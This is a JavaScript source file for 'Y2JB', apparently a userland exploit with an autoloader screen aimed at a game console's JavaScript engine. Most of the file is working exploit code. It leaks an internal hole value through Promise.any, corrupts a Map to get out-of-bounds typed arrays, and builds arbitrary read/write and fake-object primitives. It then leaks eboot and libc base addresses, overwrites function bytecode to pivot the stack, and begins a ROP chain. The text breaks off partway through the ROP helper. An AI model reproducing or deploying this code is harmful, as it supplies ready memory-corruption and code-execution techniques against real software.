/*
    Copyright (C) 2025 Gezine
    
    This software may be modified and distributed under the terms
    of the MIT license.  See the LICENSE file for details.
*/

const version_string = "Y2JB 1.3 by Gezine";
const autoloader_version = "v0.5";

const UI_CONFIG = {
    pageBackgroundColor: "#272727",
    titleText: "Y2JB Autoloader",
    titleFontFamily: "monospace",
    titleFontSize: "42px",
    titleColor: "#ccc",
    titlePadding: "10px",
    titleMarginTop: "60px",
    titleMarginBottom: "5px",
    logWrapperWidth: "62%",
    logWrapperHeight: "62%",
    logWrapperBackgroundColor: "#000",
    logWrapperBorderColor: "red",
    logWrapperBorderWidth: "2px",
    logWrapperBorderRadius: "8px",
    logWrapperOverflowY: "scroll",
    logWrapperScrollbarColor: "#aa0000 #202020",
    logContainerPadding: "10px",
    logFontFamily: "monospace",
    logFontSize: "28px",
    logTextColorDefault: "#ccc",
    logTextColorError: "red",
    logTextColorSuccess: "lightgreen",
    logTextColorWarning: "yellow",
    logMaxEntries: 20,
    progressBarContainerWidth: "60%",
    progressBarContainerHeight: "100px",
    progressBarContainerBackgroundColor: "#202020",
    progressBarContainerBorderColor: "red",
    progressBarContainerBorderWidth: "2px",
    progressBarContainerBorderRadius: "16px",
    progressBarContainerMarginTop: "30px",
    progressBarFillColor: "#aa0000",
    progressLabelColor: "#fff",
    progressLabelFontSize: "42px"
};

async function load_localscript(src) {
    return new Promise((resolve, reject) => {
        const script = document.createElement('script');
        script.src = src;
        script.onload = resolve;
        script.onerror = reject;
        document.head.appendChild(script);
    });
}

(async function() {
    await load_localscript('global.js');
})();

let NETWORK_LOGGING = false;
let LOG_SERVER = 'http://192.168.1.180:8080/log';

async function checkLogServer() {
    try {
        const timeoutPromise = new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Timeout')), 800)
        );
        
        const fetchPromise = fetch(LOG_SERVER, {
            method: 'POST',
            body: 'Log server check from Y2JB'
        });
        
        await Promise.race([fetchPromise, timeoutPromise]);
        
        NETWORK_LOGGING = true;
    } catch (e) {
        NETWORK_LOGGING = false;
    }
}

const baseWidth = 1920;
const baseHeight = 1080;
const scale = window.innerWidth / baseWidth;

let outputElement = null;
let maxLines = 56;
const fontSize = Math.floor((baseHeight / maxLines * 0.85) * scale);
const leftPadding = Math.floor((baseWidth * 0.005) * scale);
const topPadding = Math.floor((baseHeight * 0.005) * scale);

async function log(msg) {
    let message = String(msg);
    if (!outputElement) {
        outputElement = document.getElementById('output');
        if (!outputElement) {
            outputElement = document.createElement('div');
            outputElement.id = 'output';
            document.body.appendChild(outputElement);
        }
        outputElement.style.paddingLeft = leftPadding + 'px';
        outputElement.style.paddingTop = topPadding + 'px'; 
    }
    
    const lines = message.split('\n');
    lines.forEach(line => {
        let lineDiv = document.createElement('div');
        lineDiv.textContent = line === '' ? '\u00A0' : line;
        lineDiv.style.fontSize = fontSize + 'px';
        
        outputElement.appendChild(lineDiv);
    });
    
    while (outputElement.children.length > maxLines) {
        outputElement.removeChild(outputElement.children[0]);
    }
    
    await new Promise(resolve => {
        requestAnimationFrame(() => {
            setTimeout(resolve, 1);
        });
    });
        
    if (NETWORK_LOGGING) {
        try {
            await fetch(LOG_SERVER, {
                method: 'POST',
                body: message,
            });
        } catch (e) { }
    }
}

function toHex(num) {
    return '0x' + BigInt(num).toString(16).padStart(16, '0');
}

function trigger() {
    let v1;
    function f0(v4) {
        v4(() => { }, v5 => {
            v1 = v5.errors;
        });
    }
    f0.resolve = function (v6) {
        return v6;
    };
    let v3 = {
        then(v7, v8) {
            v8();
        }
    };
    Promise.any.call(f0, [v3]);
    return v1[1];
}

(async function() {
    const original_log = window.log || log;
    window.log = async function(msg) {
        if (typeof msg === 'string' && (msg.includes("[ERROR]") || msg.includes("[-]"))) {
            if (typeof window.hideUI === 'function') window.hideUI();
        }
        if (typeof original_log === 'function') {
            return await original_log(msg);
        }
    };

    window.autoloader_ui = function() {
        if (document.getElementById("autoloader_ui")) {
            const existing_ui = document.getElementById("autoloader_ui");
            existing_ui.parentNode.removeChild(existing_ui);
        }

        const cfg = UI_CONFIG;

        const autoloader_ui = document.createElement("div");
        autoloader_ui.id = "autoloader_ui";
        autoloader_ui.style.position = "fixed";
        autoloader_ui.style.top = "0px";
        autoloader_ui.style.left = "0px";
        autoloader_ui.style.width = baseWidth + "px";
        autoloader_ui.style.height = baseHeight + "px";
        autoloader_ui.style.transform = "scale(" + scale + ")";
        autoloader_ui.style.transformOrigin = "top left";
        autoloader_ui.style.zIndex = "9999";
        autoloader_ui.style.backgroundColor = cfg.pageBackgroundColor;
        autoloader_ui.style.border = "1px solid black";
        autoloader_ui.style.padding = "5px";
        autoloader_ui.style.fontFamily = "Arial, sans-serif";
        autoloader_ui.style.fontSize = "8px";

        const title = document.createElement("div");
        title.textContent = cfg.titleText;
        title.style.fontFamily = cfg.titleFontFamily;
        title.style.textAlign = "center";
        title.style.fontWeight = "bold";
        title.style.color = cfg.titleColor;
        title.style.padding = cfg.titlePadding;
        title.style.borderRadius = "8px";
        title.style.marginBottom = cfg.titleMarginBottom;
        title.style.fontSize = cfg.titleFontSize;
        title.style.marginTop = cfg.titleMarginTop;
        autoloader_ui.appendChild(title);

        const logWrapper = document.createElement("div");
        logWrapper.style.width = cfg.logWrapperWidth;
        logWrapper.style.height = cfg.logWrapperHeight;        
        logWrapper.style.position = "relative";
        logWrapper.style.margin = "20px auto 0 auto";
        logWrapper.style.padding = "0px";
        logWrapper.style.color = cfg.logTextColorDefault;
        logWrapper.style.backgroundColor = cfg.logWrapperBackgroundColor;
        logWrapper.style.fontFamily = cfg.logFontFamily;
        logWrapper.style.fontSize = cfg.logFontSize;
        logWrapper.style.overflow = "hidden";
        logWrapper.style.border = cfg.logWrapperBorderWidth + " solid " + cfg.logWrapperBorderColor;
        logWrapper.style.borderRadius = cfg.logWrapperBorderRadius;
        logWrapper.style.overflowY = cfg.logWrapperOverflowY;
        logWrapper.id = "logWrapper";
        if (cfg.logWrapperScrollbarColor) {
            logWrapper.style.scrollbarColor = cfg.logWrapperScrollbarColor;
        }
        autoloader_ui.appendChild(logWrapper);

        const logContainer = document.createElement("div");
        logContainer.id = "logContainer";
        logContainer.style.position = "absolute";
        logContainer.style.bottom = "0";
        logContainer.style.padding = cfg.logContainerPadding;
        logWrapper.appendChild(logContainer);

        const progressBarContainer = document.createElement("div");
        progressBarContainer.style.width = cfg.progressBarContainerWidth;
        progressBarContainer.style.height = cfg.progressBarContainerHeight;
        progressBarContainer.style.backgroundColor = cfg.progressBarContainerBackgroundColor;
        progressBarContainer.style.border = cfg.progressBarContainerBorderWidth + " solid " + cfg.progressBarContainerBorderColor;
        progressBarContainer.style.borderRadius = cfg.progressBarContainerBorderRadius;
        progressBarContainer.style.margin = "0 auto";
        progressBarContainer.style.overflow = "hidden";
        progressBarContainer.style.position = "relative";
        progressBarContainer.style.marginTop = cfg.progressBarContainerMarginTop;
        autoloader_ui.appendChild(progressBarContainer);

        const progressLabel = document.createElement("div");
        progressLabel.id = "progressLabel";
        progressLabel.textContent = "Loading...";
        progressLabel.style.position = "absolute";
        progressLabel.style.top = "50%";
        progressLabel.style.left = "50%";
        progressLabel.style.transform = "translate(-50%, -50%)";
        progressLabel.style.color = cfg.progressLabelColor;
        progressLabel.style.fontSize = cfg.progressLabelFontSize;
        progressLabel.style.fontWeight = "bold";
        progressLabel.style.zIndex = "1";
        progressBarContainer.appendChild(progressLabel);

        const progressBar = document.createElement("div");
        progressBar.id = "progressBar";
        progressBar.style.width = "100%";
        progressBar.style.height = "100%";
        progressBar.style.backgroundColor = cfg.progressBarFillColor;
        progressBar.style.transformOrigin = "left";
        progressBar.style.transform = "scaleX(0)";
        progressBar.style.transition = "transform 0.5s ease-in-out";
        progressBarContainer.appendChild(progressBar);

        document.body.appendChild(autoloader_ui);
    };

    window.updateProgress = function(percent, message="Loading...") {
        const progressBar = document.getElementById("progressBar");
        if (progressBar) {
            progressBar.style.transform = 'scaleX(' + percent/100 + ')';
        }
        const progressLabel = document.getElementById("progressLabel");
        if (progressLabel) {
            progressLabel.textContent = message;
        }
        window.uiLog(message, "warning");
    };

    window.uiLog = function(message, type="info") {
        if (typeof message === 'string' && (message.includes("[ERROR]") || message.includes("[-]"))) {
            if (typeof window.hideUI === 'function') window.hideUI();
        }
        const logContainer = document.getElementById("logContainer");
        if (logContainer) {
            const logEntry = document.createElement("div");
            const cfg = UI_CONFIG;
            switch (type) {
                case "error": logEntry.style.color = cfg.logTextColorError; break;
                case "success": logEntry.style.color = cfg.logTextColorSuccess; break;
                case "warning": logEntry.style.color = cfg.logTextColorWarning; break;
                default: logEntry.style.color = cfg.logTextColorDefault; break;
            }
            logEntry.textContent = message;
            logContainer.appendChild(logEntry);
            if (logContainer.childElementCount > cfg.logMaxEntries) {
                logContainer.removeChild(logContainer.firstChild);
            }
            const logWrapper = document.getElementById("logWrapper");
            if (logWrapper) {
                logWrapper.scrollTop = logWrapper.scrollHeight;
            }
        }
    };

    window.hideUI = function() {
        if (document.getElementById("autoloader_ui")) {
            const existing_ui = document.getElementById("autoloader_ui");
            existing_ui.parentNode.removeChild(existing_ui);
        }
    };

    try {
        if (typeof window.autoloader_ui === 'function') {
            window.autoloader_ui();
            window.uiLog("Autoloader " + autoloader_version + " by PLK", "success");
            window.updateProgress(0, "Running userland exploit...");
            window.uiLog("Y2JB by Gezine", "success");
        }
        await log(version_string);
        await log('Starting Exploit');
        
        await gc();
        await gc();
        await gc();
        await gc();
        
        let hole = trigger();
        
        for (let i = 0; i < 0x10; i++) {
            map1 = new Map();
            map1.set(1, 1);
            map1.set(hole, 1);
            map1.delete(hole);
            map1.delete(hole);
            map1.delete(1);
            oob_arr = new BigUint64Array([0x4141414141414141n]);
        }
        
        victim_arr = new BigUint64Array([0x4343434343434343n, 0x4343434343434343n]);
        obj_arr = [{}, {}];

        map1.set(0x1e, -1);
        gc();
        map1.set(0x0, 0x1);
        
        await log ("oob_arr length : " + toHex(oob_arr.length));
        
        const oob_arr_before = [];
        for (let i = 0; i < 100; i++) {
            oob_arr_before[i] = oob_arr[i];
        }
        
        obj_arr[0] = 0x1n;

        let obj_arr_offset = -1;
        for (let i = 0; i < 100; i++) {
            if (oob_arr[i] !== oob_arr_before[i]) {
                obj_arr_offset = i;
                break;
            }
        }
        
        if (obj_arr_offset === -1) {
            throw new Error("Failed to get unstable primitive");
        }
        
        await log("Unstable primitive achieved");
        
        function addrof_unstable(obj) {
            const obj_arr_org_value = oob_arr[obj_arr_offset];
            obj_arr[0] = obj;
            const addr = oob_arr[obj_arr_offset] - 1n;
            oob_arr[obj_arr_offset] = obj_arr_org_value;
            return addr;
        }
        
        function read64_unstable(addr) {
            const victim_arr_org_base = oob_arr[33];
            oob_arr[33] = addr - 0xfn;
            const value = victim_arr[0];
            oob_arr[33] = victim_arr_org_base;
            return value;
        }
        
        function write64_unstable(addr, value) {
            const victim_arr_org_base = oob_arr[33];
            oob_arr[33] = addr - 0xfn;
            victim_arr[0] = value;
            oob_arr[33] = victim_arr_org_base;
        }
        
        function create_fakeobj_unstable(addr) {
            const obj_arr_org_value = oob_arr[obj_arr_offset];
            oob_arr[obj_arr_offset] = addr + 1n;
            const fake_obj = obj_arr[0];
            oob_arr[obj_arr_offset] = obj_arr_org_value;
            return fake_obj;
        }                
        
        const stable_array = new Array(0x10000);
        for (let i = 0; i < stable_array.length; i++) {
            stable_array[i] = {};
        }
                        
        const double_template = new Array(0x10);
        double_template.fill(3.14);
        const double_template_addr = addrof_unstable(double_template);
        const double_elements_addr = read64_unstable(double_template_addr + 0x10n) - 1n;
        const fixed_double_array_map = read64_unstable(double_elements_addr + 0x00n);
        
        const stable_array_addr = addrof_unstable(stable_array);
        const stable_elements_addr = read64_unstable(stable_array_addr + 0x10n) - 1n;
        
        write64_unstable(stable_elements_addr + 0x00n, fixed_double_array_map);
        
        const template_biguint = new BigUint64Array(64);
        const template_biguint_addr = addrof_unstable(template_biguint);
        const template_biguint_elements = read64_unstable(template_biguint_addr + 0x10n) - 1n;
        
        const biguint_map = read64_unstable(template_biguint_addr + 0x00n);
        const biguint_props = read64_unstable(template_biguint_addr + 0x08n);
        const biguint_elem_map = read64_unstable(template_biguint_elements + 0x00n);
        const biguint_elem_len = read64_unstable(template_biguint_elements + 0x08n);
        
        const template_small = new BigUint64Array(8);
        const template_small_addr = addrof_unstable(template_small);
        const template_small_buffer_addr = read64_unstable(template_small_addr + 0x18n) - 1n;
        const template_small_elements_addr = read64_unstable(template_small_addr + 0x10n) - 1n;
        
        const small_map = read64_unstable(template_small_addr + 0x00n);
        const small_props = read64_unstable(template_small_addr + 0x08n);
        const small_elem_map = read64_unstable(template_small_elements_addr + 0x00n);
        const small_elem_length_field = read64_unstable(template_small_elements_addr + 0x08n);
        
        const small_buffer_map = read64_unstable(template_small_buffer_addr + 0x00n);
        const small_buffer_props = read64_unstable(template_small_buffer_addr + 0x08n);
        const small_buffer_elements = read64_unstable(template_small_buffer_addr + 0x10n);
        const small_buffer_bit_field = read64_unstable(template_small_buffer_addr + 0x30n);
        
        const template_buffer = new ArrayBuffer(1024);
        const template_buffer_addr = addrof_unstable(template_buffer);
        const template_buffer_elements = read64_unstable(template_buffer_addr + 0x10n) - 1n;
        
        const buffer_map = read64_unstable(template_buffer_addr + 0x00n);
        const buffer_props = read64_unstable(template_buffer_addr + 0x08n);
        const buffer_elem_map = read64_unstable(template_buffer_elements + 0x00n);
        const buffer_elem_len = read64_unstable(template_buffer_elements + 0x08n);
        
        const template_array = [{}, {}];
        const template_array_addr = addrof_unstable(template_array);
        const template_array_elements_addr = read64_unstable(template_array_addr + 0x10n) - 1n;
        
        const array_map = read64_unstable(template_array_addr + 0x00n);
        const array_props = read64_unstable(template_array_addr + 0x08n);
        const array_elem_map = read64_unstable(template_array_elements_addr + 0x00n);
        
        const heap_number = 1.1;
        const heap_number_addr = addrof_unstable(heap_number);
        const heap_number_map = read64_unstable(heap_number_addr);
        
        const base = stable_elements_addr + 0x2000n;
        
        const fake_rw_data = base + 0x0000n;
        const fake_array_elements_data = fake_rw_data + 0x0000n;
        
        const fake_arr2_obj = base + 0x0100n;
        const fake_arr2_elements = base + 0x0150n;
        const fake_rw2_data = base + 0x0200n;
        
        const fake_bc_base = base + 0x0400n;
        const fake_bc_buffer = fake_bc_base + 0x00n;
        const fake_bc_elements = fake_bc_base + 0x48n;
        const fake_bc_data = fake_bc_base + 0x58n;
        const fake_bc_obj = fake_bc_base + 0x98n;
        
        const fake_frame_base = base + 0x0600n;
        const fake_frame_buffer = fake_frame_base + 0x00n;
        const fake_frame_elements = fake_frame_base + 0x48n;
        const fake_frame_data = fake_frame_base + 0x58n;
        const fake_frame_obj = fake_frame_base + 0x98n;
        
        const fake_buffer_rw2_obj = base + 0x0800n;
        const fake_buffer_rw2_elements = base + 0x0850n;
        
        const fake_buffer_rw_obj = base + 0x1000n;
        const fake_buffer_rw_elements = base + 0x1050n;
        const fake_array_obj = base + 0x1100n;
        const fake_rw_obj = base + 0x1200n;
        const fake_rw_elements = base + 0x1250n;
        
        const fake_rop_chain_data = base + 0x2000n;
        const fake_rop_chain_buffer_obj = base + 0x3000n;
        const fake_rop_chain_buffer_elements = base + 0x3050n;
        const fake_rop_chain_obj = base + 0x3100n;
        const fake_rop_chain_elements = base + 0x3150n;
        
        const fake_return_value_elements = base + 0x4000n;
        const fake_return_value_buffer_obj = base + 0x4100n;
        const fake_return_value_buffer_elements = base + 0x4150n;
        const fake_return_value_obj = base + 0x4200n;
        
        write64_unstable(fake_array_elements_data + 0x00n, array_elem_map);
        write64_unstable(fake_array_elements_data + 0x08n, 0x0000001000000000n);
        
        for (let i = 0n; i < 16n; i++) {
            write64_unstable(fake_array_elements_data + 0x10n + i * 8n, 0n);
        }
        
        write64_unstable(fake_array_obj + 0x00n, array_map);
        write64_unstable(fake_array_obj + 0x08n, array_props);
        write64_unstable(fake_array_obj + 0x10n, fake_array_elements_data + 1n);
        write64_unstable(fake_array_obj + 0x18n, 0x0000001000000000n);
        
        write64_unstable(fake_buffer_rw_elements + 0x00n, buffer_elem_map);
        write64_unstable(fake_buffer_rw_elements + 0x08n, buffer_elem_len);
        
        write64_unstable(fake_buffer_rw_obj + 0x00n, buffer_map);
        write64_unstable(fake_buffer_rw_obj + 0x08n, buffer_props);
        write64_unstable(fake_buffer_rw_obj + 0x10n, fake_buffer_rw_elements + 1n);
        write64_unstable(fake_buffer_rw_obj + 0x18n, 0x1000n);
        write64_unstable(fake_buffer_rw_obj + 0x20n, fake_rw_data);
        write64_unstable(fake_buffer_rw_obj + 0x28n, 0n);
        write64_unstable(fake_buffer_rw_obj + 0x30n, 0n);
        
        write64_unstable(fake_buffer_rw2_elements + 0x00n, buffer_elem_map);
        write64_unstable(fake_buffer_rw2_elements + 0x08n, buffer_elem_len);
        
        write64_unstable(fake_buffer_rw2_obj + 0x00n, buffer_map);
        write64_unstable(fake_buffer_rw2_obj + 0x08n, buffer_props);
        write64_unstable(fake_buffer_rw2_obj + 0x10n, fake_buffer_rw2_elements + 1n);
        write64_unstable(fake_buffer_rw2_obj + 0x18n, 0x200n);
        write64_unstable(fake_buffer_rw2_obj + 0x20n, fake_rw2_data);
        write64_unstable(fake_buffer_rw2_obj + 0x28n, 0n);
        write64_unstable(fake_buffer_rw2_obj + 0x30n, 0n);
        
        write64_unstable(fake_arr2_elements + 0x00n, biguint_elem_map);
        write64_unstable(fake_arr2_elements + 0x08n, biguint_elem_len);
        
        write64_unstable(fake_arr2_obj + 0x00n, biguint_map);
        write64_unstable(fake_arr2_obj + 0x08n, biguint_props);
        write64_unstable(fake_arr2_obj + 0x10n, fake_arr2_elements + 1n);
        write64_unstable(fake_arr2_obj + 0x18n, fake_buffer_rw2_obj + 1n);
        write64_unstable(fake_arr2_obj + 0x20n, 0n);
        write64_unstable(fake_arr2_obj + 0x28n, 0x200n);
        write64_unstable(fake_arr2_obj + 0x30n, 0x40n);
        write64_unstable(fake_arr2_obj + 0x38n, fake_rw2_data);
        write64_unstable(fake_arr2_obj + 0x40n, 0n);
        
        write64_unstable(fake_rw_elements + 0x00n, biguint_elem_map);
        write64_unstable(fake_rw_elements + 0x08n, biguint_elem_len);
        
        write64_unstable(fake_rw_obj + 0x00n, biguint_map);
        write64_unstable(fake_rw_obj + 0x08n, biguint_props);
        write64_unstable(fake_rw_obj + 0x10n, fake_rw_elements + 1n);
        write64_unstable(fake_rw_obj + 0x18n, fake_buffer_rw_obj + 1n);
        write64_unstable(fake_rw_obj + 0x20n, 0n);
        write64_unstable(fake_rw_obj + 0x28n, 0x1000n);
        write64_unstable(fake_rw_obj + 0x30n, 0x200n);
        write64_unstable(fake_rw_obj + 0x38n, fake_rw_data);
        write64_unstable(fake_rw_obj + 0x40n, 0n);
        
        write64_unstable(fake_bc_buffer + 0x00n, small_buffer_map);
        write64_unstable(fake_bc_buffer + 0x08n, small_buffer_props);
        write64_unstable(fake_bc_buffer + 0x10n, small_buffer_elements);
        write64_unstable(fake_bc_buffer + 0x18n, 0x40n);
        write64_unstable(fake_bc_buffer + 0x20n, 0n);
        write64_unstable(fake_bc_buffer + 0x28n, 0n);
        write64_unstable(fake_bc_buffer + 0x30n, small_buffer_bit_field);
        
        write64_unstable(fake_bc_buffer + 0x38n, 0n);
        write64_unstable(fake_bc_buffer + 0x40n, 0n);
        
        write64_unstable(fake_bc_elements + 0x00n, small_elem_map);
        write64_unstable(fake_bc_elements + 0x08n, small_elem_length_field);
        
        write64_unstable(fake_bc_obj + 0x00n, small_map);
        write64_unstable(fake_bc_obj + 0x08n, small_props);
        write64_unstable(fake_bc_obj + 0x10n, fake_bc_elements + 1n);
        write64_unstable(fake_bc_obj + 0x18n, fake_bc_buffer + 1n);
        write64_unstable(fake_bc_obj + 0x20n, 0n);
        write64_unstable(fake_bc_obj + 0x28n, 0x40n);
        write64_unstable(fake_bc_obj + 0x30n, 0x8n);
        write64_unstable(fake_bc_obj + 0x38n, 0xfn);
        write64_unstable(fake_bc_obj + 0x40n, fake_bc_elements + 1n);
        
        write64_unstable(fake_frame_buffer + 0x00n, small_buffer_map);
        write64_unstable(fake_frame_buffer + 0x08n, small_buffer_props);
        write64_unstable(fake_frame_buffer + 0x10n, small_buffer_elements);
        write64_unstable(fake_frame_buffer + 0x18n, 0x40n);
        write64_unstable(fake_frame_buffer + 0x20n, 0n);
        write64_unstable(fake_frame_buffer + 0x28n, 0n);
        write64_unstable(fake_frame_buffer + 0x30n, small_buffer_bit_field);
        
        write64_unstable(fake_frame_buffer + 0x38n, 0n);
        write64_unstable(fake_frame_buffer + 0x40n, 0n);
        
        write64_unstable(fake_frame_elements + 0x00n, small_elem_map);
        write64_unstable(fake_frame_elements + 0x08n, small_elem_length_field);
        
        write64_unstable(fake_frame_obj + 0x00n, heap_number_map);
        write64_unstable(fake_frame_obj + 0x08n, small_props);
        write64_unstable(fake_frame_obj + 0x10n, fake_frame_elements + 1n);
        write64_unstable(fake_frame_obj + 0x18n, fake_frame_buffer + 1n);
        write64_unstable(fake_frame_obj + 0x20n, 0n);
        write64_unstable(fake_frame_obj + 0x28n, 0x40n);
        write64_unstable(fake_frame_obj + 0x30n, 0x8n);
        write64_unstable(fake_frame_obj + 0x38n, 0xfn);
        write64_unstable(fake_frame_obj + 0x40n, fake_frame_elements + 1n);
        
        for (let i = 0n; i < 0x40n; i += 8n) {
            write64_unstable(fake_bc_data + i, 0n);
            write64_unstable(fake_frame_data + i, 0n);
        }
        
        write64_unstable(fake_rop_chain_elements + 0x00n, biguint_elem_map);
        write64_unstable(fake_rop_chain_elements + 0x08n, biguint_elem_len);
        
        write64_unstable(fake_rop_chain_buffer_elements + 0x00n, buffer_elem_map);
        write64_unstable(fake_rop_chain_buffer_elements + 0x08n, buffer_elem_len);
        
        write64_unstable(fake_rop_chain_buffer_obj + 0x00n, buffer_map);
        write64_unstable(fake_rop_chain_buffer_obj + 0x08n, buffer_props);
        write64_unstable(fake_rop_chain_buffer_obj + 0x10n, fake_rop_chain_buffer_elements + 1n);
        write64_unstable(fake_rop_chain_buffer_obj + 0x18n, 0x800n);
        write64_unstable(fake_rop_chain_buffer_obj + 0x20n, fake_rop_chain_data);
        write64_unstable(fake_rop_chain_buffer_obj + 0x28n, 0n);
        write64_unstable(fake_rop_chain_buffer_obj + 0x30n, 0n);
        
        write64_unstable(fake_rop_chain_obj + 0x00n, biguint_map);
        write64_unstable(fake_rop_chain_obj + 0x08n, biguint_props);
        write64_unstable(fake_rop_chain_obj + 0x10n, fake_rop_chain_elements + 1n);
        write64_unstable(fake_rop_chain_obj + 0x18n, fake_rop_chain_buffer_obj + 1n);
        write64_unstable(fake_rop_chain_obj + 0x20n, 0n);
        write64_unstable(fake_rop_chain_obj + 0x28n, 0x800n);
        write64_unstable(fake_rop_chain_obj + 0x30n, 0x100n);
        write64_unstable(fake_rop_chain_obj + 0x38n, fake_rop_chain_data);
        write64_unstable(fake_rop_chain_obj + 0x40n, 0n);
        
        write64_unstable(fake_return_value_elements + 0x00n, small_elem_map);
        write64_unstable(fake_return_value_elements + 0x08n, small_elem_length_field);
        
        write64_unstable(fake_return_value_buffer_elements + 0x00n, buffer_elem_map);
        write64_unstable(fake_return_value_buffer_elements + 0x08n, buffer_elem_len);
        
        write64_unstable(fake_return_value_buffer_obj + 0x00n, small_buffer_map);
        write64_unstable(fake_return_value_buffer_obj + 0x08n, small_buffer_props);
        write64_unstable(fake_return_value_buffer_obj + 0x10n, small_buffer_elements);
        write64_unstable(fake_return_value_buffer_obj + 0x18n, 0x40n);
        write64_unstable(fake_return_value_buffer_obj + 0x20n, 0n);
        write64_unstable(fake_return_value_buffer_obj + 0x28n, 0n);
        write64_unstable(fake_return_value_buffer_obj + 0x30n, small_buffer_bit_field);
        
        write64_unstable(fake_return_value_obj + 0x00n, small_map);
        write64_unstable(fake_return_value_obj + 0x08n, small_props);
        write64_unstable(fake_return_value_obj + 0x10n, fake_return_value_elements + 1n);
        write64_unstable(fake_return_value_obj + 0x18n, fake_return_value_buffer_obj + 1n);
        write64_unstable(fake_return_value_obj + 0x20n, 0n);
        write64_unstable(fake_return_value_obj + 0x28n, 0x40n);
        write64_unstable(fake_return_value_obj + 0x30n, 0x8n);
        write64_unstable(fake_return_value_obj + 0x38n, 0xfn);
        write64_unstable(fake_return_value_obj + 0x40n, fake_return_value_elements + 1n);
        
        const fake_rw = create_fakeobj_unstable(fake_rw_obj);
        const fake_arr2 = create_fakeobj_unstable(fake_arr2_obj);
        const fake_array = create_fakeobj_unstable(fake_array_obj);
        
        const arr2_external_offset = Number((fake_arr2_obj + 0x38n - fake_rw_data) / 8n);
        const fake_array_slot0_offset = Number((fake_array_elements_data + 0x10n - fake_rw_data) / 8n);
        
        addrof = function(obj) {
            const arr_elements_org = fake_rw[fake_array_slot0_offset];
            fake_array[0] = obj;
            const addr = fake_rw[fake_array_slot0_offset] - 1n;
            fake_rw[fake_array_slot0_offset] = arr_elements_org;
            return addr;
        }
        
        read64 = function(addr) {
            const arr2_external_org = fake_rw[arr2_external_offset];
            fake_rw[arr2_external_offset] = addr;
            const value = fake_arr2[0];
            fake_rw[arr2_external_offset] = arr2_external_org;
            return value;
        }
        
        write64 = function(addr, value) {
            const arr2_external_org = fake_rw[arr2_external_offset];
            fake_rw[arr2_external_offset] = addr;
            fake_arr2[0] = value;
            fake_rw[arr2_external_offset] = arr2_external_org;
        }
        
        create_fakeobj = function(addr) {
            const arr_elements_org = fake_rw[fake_array_slot0_offset];
            fake_rw[fake_array_slot0_offset] = addr + 1n;
            const fake_obj = fake_array[0];
            fake_rw[fake_array_slot0_offset] = arr_elements_org;
            return fake_obj;
        }                

        read8 = function(addr) {
            const qword = read64(addr & ~7n);
            const byte_offset = Number(addr & 7n);
            return (qword >> BigInt(byte_offset * 8)) & 0xFFn;
        }

        write8 = function(addr, value) {
            const qword = read64(addr & ~7n);
            const byte_offset = Number(addr & 7n);
            const mask = 0xFFn << BigInt(byte_offset * 8);
            const new_qword = (qword & ~mask) | ((BigInt(value) & 0xFFn) << BigInt(byte_offset * 8));
            write64(addr & ~7n, new_qword);
        }

        read16 = function(addr) {
            const qword = read64(addr & ~7n);
            const byte_offset = Number(addr & 7n);
            return (qword >> BigInt(byte_offset * 8)) & 0xFFFFn;
        }
        
        write16 = function(addr, value) {
            const qword = read64(addr & ~7n);
            const byte_offset = Number(addr & 7n);
            const mask = 0xFFFFn << BigInt(byte_offset * 8);
            const new_qword = (qword & ~mask) | ((BigInt(value) & 0xFFFFn) << BigInt(byte_offset * 8));
            write64(addr & ~7n, new_qword);
        }
        
        read32 = function(addr) {
            const qword = read64(addr & ~7n);
            const byte_offset = Number(addr & 7n);
            return (qword >> BigInt(byte_offset * 8)) & 0xFFFFFFFFn;
        }

        write32 = function(addr, value) {
            const qword = read64(addr & ~7n);
            const byte_offset = Number(addr & 7n);
            const mask = 0xFFFFFFFFn << BigInt(byte_offset * 8);
            const new_qword = (qword & ~mask) | ((BigInt(value) & 0xFFFFFFFFn) << BigInt(byte_offset * 8));
            write64(addr & ~7n, new_qword);
        }
        
        get_backing_store = function(typed_array) {
            const obj_addr = addrof(typed_array);
            const external = read64(obj_addr + 0x38n);
            const base = read64(obj_addr + 0x40n);
            return base + external;
        }
        
        malloc = function(size) {
            const buffer = new ArrayBuffer(Number(size));
            const buffer_addr = addrof(buffer);
            const backing_store = read64(buffer_addr + 0x20n);
            allocated_buffers.push(buffer);
            return backing_store;
        }
        
        await log("Stable primitive achieved");
        await log("Setting up ROP...");
        
        pwn = function(x) {
            let dummy1 = x + 1;
            let dummy2 = x + 2;
            let dummy3 = x + 3;
            let dummy4 = x + 4;
            let dummy5 = x + 5;
            return x;
        }
        
        pwn(1);
        
        get_bytecode_addr = function() {
            const pwn_addr = addrof(pwn);
            const sfi_addr = read64(pwn_addr + 0x18n) - 1n;
            const bytecode_addr = read64(sfi_addr + 0x8n) - 1n;
            return bytecode_addr;
        }
        
        rop_chain = create_fakeobj(fake_rop_chain_obj);
        fake_bc = create_fakeobj(fake_bc_obj);
        fake_frame = create_fakeobj(fake_frame_obj);
        return_value_buf = create_fakeobj(fake_return_value_obj);
        
        const bytecode_addr = get_bytecode_addr();
        bc_start = bytecode_addr + 0x36n;
        write64(bc_start, 0xAB0025n);
        
        const stack_addr = addrof(pwn(1)) + 0x1n;
        await log("Stack leak @ " + toHex(stack_addr));
        
        eboot_base = read64(stack_addr + 0x8n) - 0xFBC81Fn;
        await log("eboot_base @ " + toHex(eboot_base));
        
        libc_base = read64(eboot_base + 0x2A66660n) - 0x851A0n;
        await log("libc_base @ " + toHex(libc_base));
        
        const rop_chain_addr = get_backing_store(rop_chain);
        
        fake_bc[0] = 0xABn;
        const fake_bc_addr = get_backing_store(fake_bc);
        
        const fake_frame_backing = get_backing_store(fake_frame);
        
        write64(fake_frame_backing + 0x21n, fake_bc_addr);
        
        return_value_addr = get_backing_store(return_value_buf);
        
        const fake_frame_addr = addrof(fake_frame);
        write64(fake_frame_addr + 0x09n, ROP.pop_rsp);
        write64(fake_frame_addr + 0x11n, rop_chain_addr);

        call_rop = function(address, rax = 0x0n, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
            let rop_i = 0;
            rop_chain[rop_i++] = ROP.pop_rax;
            rop_chain[rop_i++] = rax;
            rop_chain[rop_i++] = ROP.pop_rdi;
            rop_chain[rop_i++] = arg1;
            rop_chain[rop_i++] = ROP.pop_rsi;
            rop_chain[rop_i++] = arg2;
            rop_chain[rop_i++] = ROP.pop_rdx;
            rop_chain[rop_i++] = arg3;
            rop_chain[rop_i++] = ROP.pop_rcx;
            rop_chain[rop_i++] = arg4;
